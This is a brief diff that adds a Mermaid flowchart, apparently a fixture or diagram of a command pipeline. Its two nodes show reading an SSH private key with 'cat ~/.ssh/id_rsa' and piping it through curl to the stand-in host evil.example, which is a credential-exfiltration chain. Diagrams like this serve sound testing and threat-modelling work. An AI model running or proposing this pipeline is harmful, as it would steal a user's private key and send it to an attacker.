@@ -1,0 +1,4 @@
+flowchart LR
+    n0["command: cat ~/.ssh/id_rsa"]
+    n1["command: bash -c 'curl -d @- https://evil.example'"]
+    n0 -->|"pipe"| n1
